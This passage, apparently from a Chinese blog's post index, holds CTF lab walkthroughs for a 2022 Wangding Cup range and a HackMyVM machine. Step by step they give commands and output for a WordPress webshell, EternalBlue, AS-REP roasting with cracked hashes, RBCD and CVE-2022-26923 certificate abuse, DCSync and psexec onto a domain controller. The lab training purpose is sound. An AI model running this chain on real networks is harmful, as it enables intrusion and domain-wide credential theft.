affiliated companies\n\n[*] Requesting shares on 172.22.6.12.....\n[*] Found writable share ADMIN$\n[*] Uploading file FFcjQxtS.exe\n[*] Opening SVCManager on 172.22.6.12.....\n[*] Creating service kiNB on 172.22.6.12.....\n[*] Starting service kiNB.....\n[!] Press help for extra shell commands\nMicrosoft Windows [版本 10.0.14393]\n(c) 2016 Microsoft Corporation。保留所有权利。\n\nC:\\Windows\\system32> type C:\\Users\\Administrator\\flag\\flag*\n\n\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-psexec  xiaorang.lab/administrator@172.22.6.25  -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  -codec gbk\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Requesting shares on 172.22.6.25.....\n[*] Found writable share ADMIN$\n[*] Uploading file GRqsuULo.exe\n[*] Opening SVCManager on 172.22.6.25.....\n[*] Creating service VUIl on 172.22.6.25.....\n[*] Starting service VUIl.....\n[!] Press help for extra shell commands\nMicrosoft Windows [版本 10.0.17763.3046]\n(c) 2018 Microsoft Corporation。保留所有权利。\n\nC:\\Windows\\system32> type C:\\Users\\Administrator\\flag\\flag*\n~~~\n\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"春秋云镜-2022网鼎杯半决赛复盘","url":"/2025/04/02/春秋云镜-2022网鼎杯半决赛复盘/","content":"\n\n\n\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 39.98.112.16 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-02 02:06 EDT\nNmap scan report for 39.98.112.16\nHost is up (0.00020s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 135.21 seconds\n~~~\n\n只开了一个 22 端口和 80 端口\n\n访问 80 端口，很明显的 wordpress 框架\n\n用 wpscan 扫描可以扫描到一个 admin 用户，爆破密码可以爆破出来 admin 的密码是 123456\n\n~~~\n[!] Valid Combinations Found:\n | Username: admin, Password: 123456\n~~~\n\n进入后台之后修改主题文件 getshell\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%981.png)\n\n访问/wp-content/themes/twentytwentyone/404.php，蚁剑连接\n\nflag01 在根目录\n\n查看网络信息，然后上传 fscan 进行内网扫描\n\n~~~\n(www-data:/tmp) $ ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 :: 1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e: 2d: a8: bd brd ff: ff: ff: ff: ff: ff\n    inet 172.22.15.26/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 1892159075sec preferred_lft 1892159075sec\n    inet6 fe80:: 216:3eff: fe2d: a8bd/64 scope link \n       valid_lft forever preferred_lft forever\n~~~\n\n~~~\n$ ./fscan -h 172.22.15.26/16 -time 10\n ___                              _\n  / _ \\     _ __  __ _ _ __ __ _  _ __| | __\n / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /\n/ /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <\n\\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\\n                     fscan version: 1.8.2\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.22.15.13    is alive\n(icmp) Target 172.22.15.18    is alive\n(icmp) Target 172.22.15.24    is alive\n(icmp) Target 172.22.15.35    is alive\n[*] Icmp alive hosts len is: 4\n172.22.15.24:3306 open\n172.22.15.35:445 open\n172.22.15.13:445 open\n172.22.15.18:445 open\n172.22.15.35:139 open\n172.22.15.24:139 open\n172.22.15.18:139 open\n172.22.15.13:139 open\n172.22.15.35:135 open\n172.22.15.24:135 open\n172.22.15.13:135 open\n172.22.15.18:135 open\n172.22.15.24:80 open\n172.22.15.18:80 open\n172.22.15.24:445 open\n172.22.15.13:88 open\n[*] alive ports len is: 16\nstart vulscan\n[*] NetInfo:\n[*]172.22.15.24\n   [->] XR-WIN08\n   [->] 172.22.15.24\n[*] NetInfo:\n[*]172.22.15.35\n   [->] XR-0687\n   [->] 172.22.15.35\n[*] NetBios: 172.22.15.35    XIAORANG\\XR-0687\n[*] NetInfo:\n[*]172.22.15.18\n   [->] XR-CA\n   [->] 172.22.15.18\n[*] NetInfo:\n[*]172.22.15.13\n   [->] XR-DC01\n   [->] 172.22.15.13\n[+] 172.22.15.24 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)\n[*] 172.22.15.13  (Windows Server 2016 Standard 14393)\n[*] NetBios: 172.22.15.13    [+]DC XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393\n[*] NetBios: 172.22.15.24    WORKGROUP\\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1\n[*] Webtoc: true\ntitle: http://172.22.15.18       code: 200 len: 703    toc: true\ntitle: IIS Windows Server\n[*] NetBios: 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393\n[*] Webtoc: true\ntitle: http://172.22.15.24       code: 302 len: 0      toc: true\ntitle: None 跳转 url: http://172.22.15.24/www\n[*] Webtoc: true\ntitle: http://172.22.15.24/www/sys/index.php code: 200 len: 135    toc: true\ntitle: None\n[+] http://172.22.15.18 poc-yaml-active-directory-certsrv-detect\n已完成 16/16\n[*] 扫描结束, 耗时: 23.238579924s\n~~~\n\n可以发现 172.22.15.24 存在 MS17-010 漏洞，直接上 msf，但是用 msf 梭哈之前需要先搭建一层代理，可以用 Venom 搭建很方便\n\n~~~\nproxychains msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/bind_tcp\nset rhosts 172.22.15.24\nexploit\n~~~\n\nflag02 在 C:\\\\users\\\\administrator\\\\flag 里，添加一个新用户然后远程桌面连接\n\n~~~\nnet user ll Asd123123 /add\nnet localgroup administrators ll /add\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%982.png)\n\n可以看到数据库的密码，这个站点还存在一个 phpmyadmin，尝试登录 `root:root@#123`，将 zdoo 库里面的 user 表导出来\n\n~~~\n#域内用户\nlixiuying@xiaorang.lab\njiaxiaoliang@xiaorang.lab\nwanglihong@xiaorang.lab\nhuachunmei@xiaorang.lab\nzhangxinyu@xiaorang.lab\nhuzhigang@xiaorang.lab\nlihongxia@xiaorang.lab\nwangyulan@xiaorang.lab\nchenjianhua@xiaorang.lab\nzhangyi@xiaorang.lab\nzhangli@xiaorang.lab\nzhangwei@xiaorang.lab\nliuqiang@xiaorang.lab\nwangfang@xiaorang.lab\nwangwei@xiaorang.lab\nlixiaoliang@xiaorang.lab\nwanghao@xiaorang.lab\n~~~\n\n将获得的账号放进 user.txt 里\n\n使用 AS-REP Roasting 攻击，尝试获取用户的密码\n\n~~~‘’\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.15.13 -usersfile users.txt -format hashcat\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n/usr/share/doc/python3-impacket/examples/GetNPUsers.py: 165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)\n$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:28dc48860e014c6d18a29bad65ba6cc8$ b6924f808e7a4d56bd403bc0e5286ad6b1cb1a39ee59331e484a90801fa82bbcb6b685236b61c5976a05330006b74f304fcfb56793de9c78d38caa16075bef947ad898c8b1130dad240a8298a98e86f18af90cebb015502c7758d6a32c366a42395d08877902d303ee0662540653b3c87c14d6d5319b63e5c5eaf6250d7e82d48d57afc56492344b618b054d6a75cf5ee014f00e92311479dba0ccb54c77b072213a42b79862f913a77a6b0fae4f9a67755ca83b583220c30b6f77296098c71bb42a2cbd8197bcd4e30598ecfbf519899b44cc5d723a4a49fc26db1a4b678a1afd4acea4b42b72949e677edd\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:2fad79d14745c573303bd34c39f80e7f$ 0d9522fc4669f0e04b80e36cef3370c1cce5e232e2b131d6d652c7e2dad452a86918cfbd25e78a701896943ba6b50e241f27b8af4b5d79cffef11fd4ee2392325a468f8ff648e70a74e7d9d2ce58990dc91b36a5c84c2ffa7f45e7cdd852dc2a8df1e5e2f9491eb5c5753cdf54cac6cc2eed2a8b9b58c3693b058fcb6a6187ae49c4d80732aa40e0e3296313962128d414b85f75cb87af301ca39664fffc192e1b62755178c4c6b8f13dd70ff912c4f637a970f33bc367e84e4c1dcb31ade4a20b0bdf8bd7c64c19adf091f4850a8ea2c7a7428bbcb17ef7c87e02ae3b5f9637902612ba8fbe65b7599a7d7e\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User lihongxia@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User wangyulan@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User chenjianhua@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n~~~\n\n返回了两个票据, 用 hashcat 爆破\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# hashcat -m 18200 user.txt /usr/share/wordlists/rockyou.txt --show\n[proxychains] DLL init: proxychains-ng 4.17\n$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:dbd1dee4c07eea9541a9f1af91b93180$ b4d238908b8d37009f9dfb5402a13f1b60567f4f8185fbbf5c9fbefe14bbe0b1f89980cd604ff68b572afe6af2d1bb4d6720abc8bdc51e47df9da3ebb4801d08f8be90c12343699eff8855dbfc0d63e796ffcec62169fa4e3ee97440ca0eb2eb985e6785f93aa1d34444235b1ce8937acf0121fe05ec2c589ba625fab1c90bd168637124f99378007fa9c459b07f946a65d3c7131cdad16af4b591becc04526125e2c255072df4a32214d393aab5f27cff28b66859c1b9bb06600d4c7a51cd7ae583d4602fd1ebd6ffc269ee60ed861abb28bb547de5e848955d5279d9e08523edb67fbd171d1af1730f2fba: winniethepooh\n$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:c640ad4dd669f00b128bad8d1ef8df86$ 0b8e74c7b36ec7daceb707ce176d18a8d15f8cd3ba3154f8ae4f29e9e54f538ab19bc766ea554698677d7f1e6f9418fd7419d82a1ca79582ed70f3de5b5c771a6e7df373fc84a9921b697e7c7d42c17e85f1b2ae73b1ec15bf1bbc59e20bfb2d4e5e52c53c1e88da9c0815434acd8298948f7becb0f15bfdcce4153d025570249523f7507c20f694f5e0ec23c8e7ef5d446aa5fec15315ab314658fc36befc39d7cdf037fa1f165a83ab257fa34a17c4b512ccca27284b97d8f7bdf51cdb0a069e2df4f952c3c52fa47fb58a0fe4e80d0907062fad92edf4d799306ddb103468accf1c2a6b172f2bd7d7c61d: 1qaz2wsx\n~~~\n\n用 bloodhound 进行域内信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -dc XR-DC01.xiaorang.lab -c all --dns-tcp -ns 172.22.15.13 --auth-method ntlm --zip\nINFO: Found AD domain: xiaorang.lab\nINFO: Connecting to LDAP server: XR-DC01.xiaorang.lab\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: XR-DC01.xiaorang.lab\nINFO: Found 37 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: XR-CA.xiaorang.lab\nINFO: Querying computer: XR-0687.xiaorang.lab\nINFO: Querying computer: XR-DC01.xiaorang.lab\nINFO: Done in 00M 05S\nINFO: Compressing output into 20250402040344_bloodhound.zip\n~~~\n\n域用户 LIXIUYING 对计算机 XR-0687$ 具有 Generic Write 权限\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%983.png)\n\n可以通过修改目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性（配置 RBCD）获取目标 SYSTEM 权限。\n\n添加一个机器用户\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-addcomputer -computer-name 'EVILCOMPUTER$' -computer-pass '123@#ABC' -dc-host XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 \" xiaorang.lab/lixiuying: winniethepooh \"\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Successfully added machine account EVILCOMPUTER$ with password 123@#ABC.\n~~~\n\n然后配置 RBCD：\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-rbcd xiaorang.lab/lixiuying: winniethepooh -action write -delegate-from \"EVILCOMPUTER $\" -delegate-to \"XR-0687$\" -dc-ip 172.22.15.13\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] EVILCOMPUTER $ can now impersonate users on XR-0687$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     EVILCOMPUTER$   (S-1-5-21-3745972894-1678056601-2622918667-1147)\n~~~\n\n请求并冒充域管权限的服务票据：\n\n```\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-getST xiaorang.lab/EVILCOMPUTER$:'123@#ABC' -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[*] Impersonating Administrator\n/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow()\n/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[*] Requesting S4U2self\n/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow()\n/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache\n```\n\n~~~\n──(root㉿kali)-[~/Desktop/tmp]\n└─#  export KRB5CCNAME = Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-psexec 'xiaorang.lab/administrator@XR-0687.xiaorang.lab' -target-ip 172.22.15.35 -codec gbk -no-pass -k\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Requesting shares on 172.22.15.35.....\n[*] Found writable share ADMIN$\n[*] Uploading file RHzxEZPZ.exe\n[*] Opening SVCManager on 172.22.15.35.....\n[*] Creating service etRo on 172.22.15.35.....\n[*] Starting service etRo.....\n[!] Press help for extra shell commands\nMicrosoft Windows [版本 10.0.20348.1668]\n(c) Microsoft Corporation。保留所有权利。\n\nC:\\Windows\\system32 >\n~~~\n\nflag03 在 C:\\users\\Administrator\\flag\\\n\n主机 172.22.15.18 (XR-CA) 存在 `CVE-2022-26923` 漏洞\n\n打 CVE-2022–26923\n\n查找证书服务器，并尝试查找可以利用的证书模板：\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# certipy-ad find -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -vulnerable -stdout\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Trying to get CA configuration for 'xiaorang-XR-CA-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'xiaorang-XR-CA-CA' via CSRA: Could not connect: [Errno 111] Connection refused\n[*] Trying to get CA configuration for 'xiaorang-XR-CA-CA' via RRP\n[!] Got error while trying to get CA configuration for 'xiaorang-XR-CA-CA' via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused\n[!] Failed to get CA configuration for 'xiaorang-XR-CA-CA'\n[*] Enumeration output:\nCertificate Authorities\n  0\n    CA Name                             : xiaorang-XR-CA-CA\n    DNS Name                            : XR-CA.xiaorang.lab\n    Certificate Subject                 : CN = xiaorang-XR-CA-CA, DC = xiaorang, DC = lab\n    Certificate Serial Number           : 3ECFB0112E93BE9041059FA6DBB3C35A\n    Certificate Validity Start          : 2023-06-03 07:19:59+00:00\n    Certificate Validity End            : 2028-06-03 07:29:58+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Unknown\n    Request Disposition                 : Unknown\n    Enforce Encryption for Requests     : Unknown\nCertificate Templates                   : [!] Could not find any certificate templates\n\n~~~\n\n使用 certipy 创建一个机器账户，并将该机器账户 dNSHostName 属性指向域控：\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# certipy-ad account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user 'EVILCOMPUTER2$' -pass '123@#ABC' -dns 'XR-DC01.xiaorang.lab'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Creating new account:\n    sAMAccountName                      : EVILCOMPUTER2$\n    unicodePwd                          : 123@#ABC\n    userAccountControl                  : 4096\n    servicePrincipalName                : HOST/EVILCOMPUTER2\n                                          RestrictedKrbHost/EVILCOMPUTER2\n    dnsHostName                         : XR-DC01.xiaorang.lab\n[*] Successfully created account 'EVILCOMPUTER2$' with password '123@#ABC'\n\n~~~\n\n使用该机器账户向 AD CS 服务器请求域控机器的证书模板：\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# certipy-ad req -u EVILCOMPUTER2\\$@xiaorang.lab -p '123@#ABC' -target 172.22.15.18 -ca \"xiaorang-XR-CA-CA\" -template Machine\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 7\n[*] Got certificate with DNS Host Name 'XR-DC01.xiaorang.lab'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'xr-dc01.pfx'\n~~~\n\n用申请到的证书，申请域控的 TGT：\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debug\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: xr-dc01$@xiaorang.lab\n[*] Trying to get TGT...\n[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)\n~~~\n\n使用 certipy 请求 TGT 失败，出现 `KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)` 错误。\n\n[bloodyAD](https://github.com/CravateRouge/bloodyAD) 使用证书进行认证，配置 RBCD 进行攻击：\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# certipy-ad cert -pfx xr-dc01.pfx > xr-dc01.pem\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# bloodyAD -d xiaorang.lab -u 'EVILCOMPUTER2 $' -c ':xr-dc01.pem' --host 172.22.15.13 --secure add rbcd 'xr-dc01$' 'EVILCOMPUTER2$'\n[!] No security descriptor has been returned, a new one will be created\n[+] EVILCOMPUTER2 $ can now impersonate users on xr-dc01$ via S4U2Proxy\n~~~\n\n请求并冒充域管权限的服务票据：\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-getST 'xiaorang.lab/EVILCOMPUTER2$: 123@#ABC' -spn LDAP/xr-dc01.xiaorang.lab -impersonate Administrator\n -dc-ip 172.22.15.13\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Getting TGT for user\n[*] Impersonating Administrator\n/usr/share/doc/python3-impacket/examples/getST.py: 380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow()\n/usr/share/doc/python3-impacket/examples/getST.py: 477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)\n[*] Requesting S4U2self\n/usr/share/doc/python3-impacket/examples/getST.py: 607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow()\n/usr/share/doc/python3-impacket/examples/getST.py: 659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# export KRB5CCNAME = Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache\n\nDCSync 从域控导出凭据：\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-secretsdump 'xiaorang.lab/administrator@XR-DC01.xiaorang.lab' -target-ip 172.22.15.13 -no-pass -k -just-dc-user Administrator\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Dumping Domain Credentials (domain\\uid: rid: lmhash: nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\n[-] 'NoneType' object has no attribute 'getRemoteHost'\n[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter\n[*] Cleaning up...\n\nPTH 登录域控：\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-psexec 'xiaorang.lab/administrator@XR-DC01.xiaorang.lab' -target-ip 172.22.15.13 -codec gbk -no-pass -k\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Requesting shares on 172.22.15.13.....\n[*] Found writable share ADMIN$\n[*] Uploading file FavsxEaA.exe\n[*] Opening SVCManager on 172.22.15.13.....\n[*] Creating service fjnA on 172.22.15.13.....\n[*] Starting service fjnA.....\n[!] Press help for extra shell commands\nMicrosoft Windows [版本 10.0.14393]\n(c) 2016 Microsoft Corporation。保留所有权利。\n\nC:\\windows\\system32 > \n~~~\n\nflag 在 C:\\Users\\Administrator\\flag 下\n\n# 参考\n\nhttps://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#as-rep-roasting\n\nhttps://x1nri.github.io/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/\n\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"Hackmyvm-Newbee","url":"/2025/03/26/Hackmyvm-Newbee/","content":"\n\n\n# 信息搜集\n\narp-scan -l\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:f5:b9:af       PCS Systemtechnik GmbH\n192.168.31.122  00:0c:29:71:20:21       VMware, Inc.\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.384 seconds (107.38 hosts/sec). 3 responded\n\n~~~\n\n192.168.31.122就是ip地址\n\nnmap 192.168.31.122 -p-扫描端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.122 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 08:21 EDT\nNmap scan report for 192.168.31.122\nHost is up (0.00090s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 00:0C:29:71:20:21 (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 6.71 seconds\n~~~\n\n# 80端口\n\n查看页面源码，在最下面可以发现有一个\n\n~~~\n<!--Wrong paramter to GET-->\n~~~\n\n对get参数进行fuzz\n\n~~~\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u \"http://192.168.31.122?FUZZ=/etc/passwd\" --hh 18851\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.31.122?FUZZ=/etc/passwd/\nTotal requests: 220559\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n\n000001799:   200        376 L    1270 W     18863 Ch    \"hack\"\n~~~\n\n能fuzz出来参数名为hack，但是页面最下方还是会报错\n\n~~~\n<!-- include failed try another file -->\n~~~\n\n尝试包含其他文件\n\n扫描目录可以扫描到一个secret.php\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"http://192.168.31.122/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m\nedium.txt -x .php,.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.122/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 279]\n/index.php            (Status: 200) [Size: 18852]\n/contact.php          (Status: 200) [Size: 8853]\n/about.php            (Status: 200) [Size: 10036]\n/blog.php             (Status: 200) [Size: 9782]\n/products.php         (Status: 200) [Size: 12163]\n/terms.php            (Status: 200) [Size: 6670]\n/assets               (Status: 301) [Size: 317] [--> http://192.168.31.122/assets/]\n/testimonials.php   